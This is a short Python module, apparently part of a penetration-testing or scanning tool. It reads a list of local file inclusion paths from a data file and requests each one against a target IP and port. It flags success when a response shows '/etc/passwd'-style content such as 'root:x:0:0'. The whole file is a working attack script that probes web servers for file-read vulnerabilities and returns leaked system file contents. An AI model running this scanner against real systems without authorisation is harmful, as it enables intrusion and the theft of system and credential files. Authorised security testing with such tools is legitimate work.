import aiohttp
import os

def load_lfi_paths():
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    file_path = os.path.join(base_dir, 'data', 'lfi_paths.txt')
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

async def run(ip, port):
    COMMON_LFI_PATHS = load_lfi_paths()
    base_url = f"http://{ip}:{port}"
    async with aiohttp.ClientSession() as session:
        for path in COMMON_LFI_PATHS:
            try:
                url = f"{base_url}{path}"
                async with session.get(url, timeout=5) as resp:
                    text = await resp.text()
                    if "root:x:0:0" in text or "/bin/bash" in text:
                        return f"{url}\n{text[:300]}"
            except:
                continue
    return None
